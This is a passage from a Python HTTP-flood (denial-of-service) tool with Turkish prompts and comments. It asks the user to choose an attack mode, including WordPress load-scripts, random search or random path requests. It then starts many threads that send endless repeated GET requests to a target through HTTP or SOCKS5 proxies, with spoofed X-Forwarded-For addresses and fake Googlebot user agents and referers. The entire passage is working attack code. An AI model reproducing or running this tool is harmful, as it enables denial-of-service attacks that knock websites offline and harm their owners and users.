            rndsor=input("Ana dizine /random dizin atak yapmak istiyor musunuz? (Y/N) giriniz. = ").upper()
            if rndsor=="Y":
                threadnormaldizinrandom=True
            if rndsor=="N":
                thread_sadeatak=True
        
            if rndsor !="N" and rndsor !="Y":
                print ("Yanlis giris yaptiniz tekrar deneyiniz")
                rndrastdizin()
        if rndrastdizin1==True:
            rndrastdizin()
        def googlewpataksor():
            global threadgooglewpload
            global threadgooglewprandom
            global rrndrastdizinn
            threadgooglewprandom=False
            threadgooglewpload=False
            rrndrastdizinn=False
            nwpatak=input("Wordpress atak yapmak istiyor musunuz? (Y/N) giriniz= ").upper()
            if nwpatak=="Y":
                wpatakcesit=input("Load-scripts atak için \"0\" - search random atak için \"1\" tuşlayınız = ")
                if wpatakcesit=="0":
                    threadgooglewpload=True
                if wpatakcesit=="1":
                    threadgooglewprandom=True
                if wpatakcesit !="0" and wpatakcesit !="1":
                    print ("Ya \"0\" yada \"1\" giriniz. tekrar deneyiniz")
                    googlewpataksor()
            if nwpatak=="N":
                rrndrastdizinn=True
            if nwpatak !="N" and nwpatak !="Y":
                print ("Yanlis giris yaptiniz tekrar deneyin")
                googlewpataksor()
        if googlewpataksorr==True:
            googlewpataksor()
        
        def googlerndrastdizinn():
            global  threadgoogledizinrandomm
            global  threadgoogle_sadeatak
            threadgoogledizinrandomm=False
            threadgoogle_sadeatak=False
            rndsor=input("Ana dizine /random dizin atak yapmak istiyor musunuz? (Y/N) giriniz. = ").upper()
            if rndsor=="Y":
                threadgoogledizinrandomm=True
            if rndsor=="N":
                threadgoogle_sadeatak=True
            if rndsor !="N" and rndsor !="Y":
                print ("Yanlış giriş yaptınız tekrar deneyiniz")
                googlerndrastdizinn()
        if rrndrastdizinn==True:
            googlerndrastdizinn()
            
    except ValueError:
        print("Lütfen porta  sayı giriniz")
        sor()
sor()
#normal atak classları ---------------------------------------------------------------------
class thereadnormalwordpressloadatak(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run (self):
        while True:
            try:
                getkodu = "GET " + url + "%s HTTP/1.1\r\nHost: "%(dexdex) + url2 + "\r\n" 
                useragent = "User-Agent: " + agentt() + "\r\n"
                kabul = random.choice(butunkabul)
                refererx = "Referer: "+ refererdex()+"\r\n"
                dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
                ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
                request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
                proxy = random.choice(kaynak).strip().split(":")
                
                if socks5proxy1==True:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                    socket.setdefaulttimeout(0.5)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
                else:
                    socket.setdefaulttimeout(0.5)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(proxy[0]), int(proxy[1])))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
            except socket.timeout:
               # print "zaman asimi"
                pass
            except EnvironmentError as exc: 
                if exc.errno == errno.ECONNREFUSED:
            #        print "bag hatasi"
                        pass
class thereadnormalwprandommsearchatak(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run (self):
        while True:
            try:
                getkodu = "GET " + url + "/?s=%s HTTP/1.1\r\nHost: "%(dex()) + url2 + "\r\n" 
                useragent = "User-Agent: " + agentt() + "\r\n"
                kabul = random.choice(butunkabul)
                refererx = "Referer: "+ refererdex()+"\r\n"
                dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
                ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
                request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
                proxy = random.choice(kaynak).strip().split(":")
                
                if socks5proxy1==True:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                    socket.setdefaulttimeout(0.5)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
                else:
                    socket.setdefaulttimeout(0.5)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(proxy[0]), int(proxy[1])))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
            except socket.timeout:
               # print "zaman asimi"
                pass
            except EnvironmentError as exc: 
                if exc.errno == errno.ECONNREFUSED:
            #        print "bag hatasi"
                    pass
        
        
        
    
class thereadnormal_random_dizin_atak(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run (self):
        while True:
            try:
                getkodu = "GET " + url + "/%s HTTP/1.1\r\nHost: "%(dex()) + url2 + "\r\n" 
                useragent = "User-Agent: " + agentt() + "\r\n"
                kabul = random.choice(butunkabul)
                refererx = "Referer: "+ refererdex()+"\r\n"
                dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
                ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
                request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
                proxy = random.choice(kaynak).strip().split(":")
                
                 
                if socks5proxy1==True:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                    socket.setdefaulttimeout(0.5)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
                else:
                    socket.setdefaulttimeout(0.5)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(proxy[0]), int(proxy[1])))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
            except socket.timeout:
               # print "zaman asimi"
                pass
            except EnvironmentError as exc: 
                if exc.errno == errno.ECONNREFUSED:
            #        print "bag hatasi"
                    pass
class thereadnormal_sadeatak(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run (self):
        while True:
            try:
                getkodu = "GET " + url + "/ HTTP/1.1\r\nHost: " + url2 + "\r\n" 
                useragent = "User-Agent: " + agentt() + "\r\n"
                kabul = random.choice(butunkabul)
                refererx = "Referer: "+ refererdex()+"\r\n"
                dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
                ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
                request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
                proxy = random.choice(kaynak).strip().split(":")
                if socks5proxy1==True:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                    socket.setdefaulttimeout(0.5)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    print ("socks5 Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
                else:
                    socket.setdefaulttimeout(0.5)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(proxy[0]), int(proxy[1])))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
            except socket.timeout:
               # print "zaman asimi"
                continue
            except EnvironmentError as exc: 
                if exc.errno == errno.ECONNREFUSED:
            #        print "bag hatasi"
                    continue





#google atak classları---------------------------------------------------------------------
class thereadgooglewordpressloadatak(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run (self):
        while True:
            try:
                getkodu = "GET " + url + "%s HTTP/1.1\r\nHost: "%(dexdex) + url2 + "\r\n" 
                useragent = "User-Agent: " + googleagent() + "\r\n"
                kabul = random.choice(butunkabul)
                refererx = "Referer: "+ refererdex()+"\r\n"
                dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
                ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
                request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
                proxy = random.choice(kaynak).strip().split(":")
                
                 
                if socks5proxy1==True:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                    socket.setdefaulttimeout(0.5)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
                else:
                    socket.setdefaulttimeout(0.5)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(proxy[0]), int(proxy[1])))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
            except socket.timeout:
               # print "zaman asimi"
                pass
            except EnvironmentError as exc: 
                if exc.errno == errno.ECONNREFUSED:
            #        print "bag hatasi"
                    pass
class thereadgooglewprandommsearchatak(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run (self):
        while True:
            try:
                getkodu = "GET " + url + "/?s=%s HTTP/1.1\r\nHost: "%(dex()) + url2 + "\r\n" 
                useragent = "User-Agent: " + googleagent() + "\r\n"
                kabul = random.choice(butunkabul)
                refererx = "Referer: "+ refererdex()+"\r\n"
                dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
                ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
                request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
                proxy = random.choice(kaynak).strip().split(":")
                if socks5proxy1==True:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                    socket.setdefaulttimeout(0.5)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
                else:
                    socket.setdefaulttimeout(0.5)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(proxy[0]), int(proxy[1])))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
            except socket.timeout:
               # print "zaman asimi"
                pass
            except EnvironmentError as exc: 
                if exc.errno == errno.ECONNREFUSED:
            #        print "bag hatasi"
                    pass
class thereadgoogle_random_dizin_atak(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run (self):
        while True:
            try:
                getkodu = "GET " + url + "/%s HTTP/1.1\r\nHost: "%(dex()) + url2 + "\r\n" 
                useragent = "User-Agent: " + googleagent() + "\r\n"
                kabul = random.choice(butunkabul)
                refererx = "Referer: "+ refererdex()+"\r\n"
                dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
                ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
                request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
                proxy = random.choice(kaynak).strip().split(":")
                if socks5proxy1==True:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                    socket.setdefaulttimeout(0.5)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
                else:
                    socket.setdefaulttimeout(0.5)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(proxy[0]), int(proxy[1])))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
            except socket.timeout:
               # print "zaman asimi"
                pass
            except EnvironmentError as exc: 
                if exc.errno == errno.ECONNREFUSED:
            #        print "bag hatasi"
                    pass
    
class thereadgoogle_sadeatak(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run (self):
        while True:
            try:
                getkodu = "GET " + url + "/ HTTP/1.1\r\nHost: " + url2 + "\r\n" 
                useragent = "User-Agent: " + googleagent() + "\r\n"
                kabul = random.choice(butunkabul)
                refererx = "Referer: "+ refererdex()+"\r\n"
                dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
                ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
                request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
                proxy = random.choice(kaynak).strip().split(":")
                if socks5proxy1==True:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                    socket.setdefaulttimeout(0.5)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
                else:
                    socket.setdefaulttimeout(0.5)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(proxy[0]), int(proxy[1])))
                    s.send(str.encode(request))
                    print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
                    try: 
                        for y in range(int(guc)): 
                            s.send(str.encode(request))
                    except socket.timeout:
                    #   print "zaman asimi"
                        pass
                    except EnvironmentError as exc: 
                        if exc.errno == errno.ECONNREFUSED:
                #        print "bag hatasi"
                            pass
                #  s.close()
            except socket.timeout:
               # print "zaman asimi"
                pass
            except EnvironmentError as exc: 
                if exc.errno == errno.ECONNREFUSED:
            #        print "bag hatasi"
                    pass
#***********************************************************************************
def normalwordpressloadatak():
    print("Saldırı başladı...")
    for i in range(threads):
        t = thereadnormalwordpressloadatak()
        #t.daemon = True
        #t.setDaemon(True)
        t.start()
       # t.join()
def normalwprandommsearchatak():
    print("Saldırı başladı...")
    for i in range(threads):
        t = thereadnormal_sadeatak()
        #t.daemon = True
        #t.setDaemon(True)
        t.start()
       # t.join()
def normal_random_dizin_atak():
    print("Saldırı başladı...")
    for i in range(threads):
        t = thereadnormal_random_dizin_atak()
        #t.daemon = True
        #t.setDaemon(True)
        t.start()
       # t.join()
def normal_sadeatak():
    print("Saldırı başladı...")
    for i in range(threads):
        t = thereadnormal_sadeatak()
        #t.daemon = True
        #t.setDaemon(True)
        t.start()
       # t.join()
if threadnormalwploadd== True:
    normalwordpressloadatak()
if threadnormalwprandommsearch== True:
    normalwprandommsearchatak()
if threadnormaldizinrandom== True:
    normal_random_dizin_atak()
if thread_sadeatak== True:
    normal_sadeatak()
#--------------------------------------------------
def googlewordpressloadatak():
    print("Saldırı başladı...")
    for i in range(threads):
        t = thereadgooglewordpressloadatak()
        #t.daemon = True
        #t.setDaemon(True)
        t.start()
def googlewprandommsearchatak():
    print("Saldırı başladı...")
    for i in range(threads):
        t = thereadgooglewprandommsearchatak()
        #t.daemon = True
        #t.setDaemon(True)
        t.start()
       # t.join()
def google_random_dizin_atak():
    print("Saldırı başladı...")
    for i in range(threads):
        t = thereadgoogle_random_dizin_atak()
        #t.daemon = True
        #t.setDaemon(True)
        t.start()
       # t.join()
def google_sadeatak():
    print("Saldırı başladı...")
    for i in range(threads):
        t = thereadgoogle_sadeatak()
        #t.daemon = True
        #t.setDaemon(True)
        t.start()
       # t.join()
if threadgooglewpload== True:
    googlewordpressloadatak()
if threadgooglewprandom== True:
    googlewprandommsearchatak()
if threadgoogledizinrandomm== True:
    google_random_dizin_atak()
if threadgoogle_sadeatak== True:
    google_sadeatak()



    
